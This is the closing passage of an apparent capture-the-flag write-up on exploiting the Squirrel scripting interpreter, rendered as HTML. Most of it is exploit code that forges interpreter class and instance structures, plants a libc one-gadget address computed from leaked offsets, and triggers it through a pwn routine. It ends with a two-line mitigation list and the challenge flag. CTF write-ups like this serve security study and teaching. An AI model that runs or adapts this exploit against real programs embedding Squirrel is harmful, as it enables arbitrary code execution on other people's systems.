    b<span class="token punctuation">.</span><span class="token function">writen</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">,</span><span class="token string">&apos;l&apos;</span><span class="token punctuation">)</span> <span class="token operator">#</span>_next
    b<span class="token punctuation">.</span><span class="token function">writen</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">,</span><span class="token string">&apos;l&apos;</span><span class="token punctuation">)</span> <span class="token operator">#</span>_prev
    b<span class="token punctuation">.</span><span class="token function">writen</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">,</span><span class="token string">&apos;l&apos;</span><span class="token punctuation">)</span> <span class="token operator">#</span>_shared_sate
    b<span class="token punctuation">.</span><span class="token function">writen</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">,</span><span class="token string">&apos;l&apos;</span><span class="token punctuation">)</span> <span class="token operator">#</span>_delegate
    b<span class="token punctuation">.</span><span class="token function">writen</span><span class="token punctuation">(</span>add<span class="token operator">+</span><span class="token number">0x10</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span><span class="token number">0x8</span><span class="token operator">*</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token string">&apos;l&apos;</span><span class="token punctuation">)</span> <span class="token operator">#</span>_class
    b<span class="token punctuation">.</span><span class="token function">writen</span><span class="token punctuation">(</span>add<span class="token operator">+</span><span class="token number">0x10</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span><span class="token number">0x8</span><span class="token operator">*</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token string">&apos;l&apos;</span><span class="token punctuation">)</span> <span class="token operator">#</span>_userpointer
    b<span class="token punctuation">.</span><span class="token function">writen</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">,</span><span class="token string">&apos;l&apos;</span><span class="token punctuation">)</span> <span class="token operator">#</span>_hook
    b<span class="token punctuation">.</span><span class="token function">writen</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">,</span><span class="token string">&apos;l&apos;</span><span class="token punctuation">)</span> <span class="token operator">#</span>_memsize
    b<span class="token punctuation">.</span><span class="token function">writen</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">,</span><span class="token string">&apos;l&apos;</span><span class="token punctuation">)</span> <span class="token operator">#</span>_values<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>type
    b<span class="token punctuation">.</span><span class="token function">writen</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">,</span><span class="token string">&apos;l&apos;</span><span class="token punctuation">)</span> <span class="token operator">#</span>_values<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>val

    <span class="token operator">#</span>fake blob _class
    b<span class="token punctuation">.</span><span class="token function">writen</span><span class="token punctuation">(</span>add<span class="token operator">+</span><span class="token number">0x10</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span><span class="token number">0x8</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">13</span><span class="token operator">+</span><span class="token number">21</span><span class="token operator">+</span><span class="token number">0x12</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token string">&apos;l&apos;</span><span class="token punctuation">)</span> <span class="token operator">#</span>vptr
    b<span class="token punctuation">.</span><span class="token function">writen</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">,</span><span class="token string">&apos;l&apos;</span><span class="token punctuation">)</span> <span class="token operator">#</span>uiref
    b<span class="token punctuation">.</span><span class="token function">writen</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">,</span><span class="token string">&apos;l&apos;</span><span class="token punctuation">)</span> <span class="token operator">#</span>weakref
    b<span class="token punctuation">.</span><span class="token function">writen</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">,</span><span class="token string">&apos;l&apos;</span><span class="token punctuation">)</span> <span class="token operator">#</span>_next
    b<span class="token punctuation">.</span><span class="token function">writen</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">,</span><span class="token string">&apos;l&apos;</span><span class="token punctuation">)</span> <span class="token operator">#</span>_prev
    b<span class="token punctuation">.</span><span class="token function">writen</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">,</span><span class="token string">&apos;l&apos;</span><span class="token punctuation">)</span> <span class="token operator">#</span>_shared_sate
    b<span class="token punctuation">.</span><span class="token function">writen</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">,</span><span class="token string">&apos;l&apos;</span><span class="token punctuation">)</span> <span class="token operator">#</span>_members
    b<span class="token punctuation">.</span><span class="token function">writen</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">,</span><span class="token string">&apos;l&apos;</span><span class="token punctuation">)</span> <span class="token operator">#</span>_base
    b<span class="token punctuation">.</span><span class="token function">writen</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">,</span><span class="token string">&apos;l&apos;</span><span class="token punctuation">)</span> <span class="token operator">#</span>_default_values<span class="token punctuation">.</span>_vals
    b<span class="token punctuation">.</span><span class="token function">writen</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">,</span><span class="token string">&apos;l&apos;</span><span class="token punctuation">)</span> <span class="token operator">#</span>_default_values<span class="token punctuation">.</span>_size
    b<span class="token punctuation">.</span><span class="token function">writen</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">,</span><span class="token string">&apos;l&apos;</span><span class="token punctuation">)</span> <span class="token operator">#</span>_default_values<span class="token punctuation">.</span>_allocated
    b<span class="token punctuation">.</span><span class="token function">writen</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">,</span><span class="token string">&apos;l&apos;</span><span class="token punctuation">)</span> <span class="token operator">#</span>_methods<span class="token punctuation">.</span>_vals
    b<span class="token punctuation">.</span><span class="token function">writen</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">,</span><span class="token string">&apos;l&apos;</span><span class="token punctuation">)</span> <span class="token operator">#</span>_methods<span class="token punctuation">.</span>_size
    b<span class="token punctuation">.</span><span class="token function">writen</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">,</span><span class="token string">&apos;l&apos;</span><span class="token punctuation">)</span> <span class="token operator">#</span>_methods<span class="token punctuation">.</span>_allocated
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">local</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">0x12</span><span class="token punctuation">;</span>i<span class="token operator">+</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        b<span class="token punctuation">.</span><span class="token function">writen</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">,</span><span class="token string">&apos;l&apos;</span><span class="token punctuation">)</span> <span class="token operator">#</span>_metamoethods<span class="token punctuation">.</span>type
        b<span class="token punctuation">.</span><span class="token function">writen</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">,</span><span class="token string">&apos;l&apos;</span><span class="token punctuation">)</span> <span class="token operator">#</span>_metamoethods<span class="token punctuation">.</span>val    
    <span class="token punctuation">}</span>
    b<span class="token punctuation">.</span><span class="token function">writen</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">,</span><span class="token string">&apos;l&apos;</span><span class="token punctuation">)</span> <span class="token operator">#</span>_attributes<span class="token punctuation">.</span>type
    b<span class="token punctuation">.</span><span class="token function">writen</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">,</span><span class="token string">&apos;l&apos;</span><span class="token punctuation">)</span> <span class="token operator">#</span>_attributes<span class="token punctuation">.</span>val
    b<span class="token punctuation">.</span><span class="token function">writen</span><span class="token punctuation">(</span><span class="token number">0x0000000080000000</span><span class="token punctuation">,</span><span class="token string">&apos;l&apos;</span><span class="token punctuation">)</span> <span class="token operator">#</span>_typetag
    b<span class="token punctuation">.</span><span class="token function">writen</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">,</span><span class="token string">&apos;l&apos;</span><span class="token punctuation">)</span> <span class="token operator">#</span>_hook
    b<span class="token punctuation">.</span><span class="token function">writen</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">,</span><span class="token string">&apos;l&apos;</span><span class="token punctuation">)</span> <span class="token operator">#</span>_locked
    b<span class="token punctuation">.</span><span class="token function">writen</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">,</span><span class="token string">&apos;l&apos;</span><span class="token punctuation">)</span> <span class="token operator">#</span>_constructoridx
    b<span class="token punctuation">.</span><span class="token function">writen</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">,</span><span class="token string">&apos;l&apos;</span><span class="token punctuation">)</span> <span class="token operator">#</span>_udsize
    b<span class="token punctuation">.</span><span class="token function">writen</span><span class="token punctuation">(</span>l_main<span class="token operator">-</span>l_offset<span class="token operator">+</span>oneg_offset<span class="token punctuation">,</span><span class="token string">&apos;l&apos;</span><span class="token punctuation">)</span>

    <span class="token punctuation">::</span>r<span class="token operator">&lt;</span><span class="token operator">-</span><span class="token function">addr2offset</span><span class="token punctuation">(</span>add<span class="token operator">-</span><span class="token number">0x30</span><span class="token punctuation">)</span>
    <span class="token function">load_opcodes</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token function">pwn</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">&quot;[!] libc offset is not set...\n&quot;</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

</pre><h2 class="mume-header" id="mitigation">Mitigation</h2>

<ul>
<li>don&apos;t use squirrel</li>
<li>sandbox your programs</li>
</ul>
<h2 class="mume-header" id="flag">Flag</h2>

<p>CSCG{t3chnic4lly_an_0d4y_but_...}</p>

      </div>
      
      
    
    
    
    
    
    
    
    
  
    </body></html>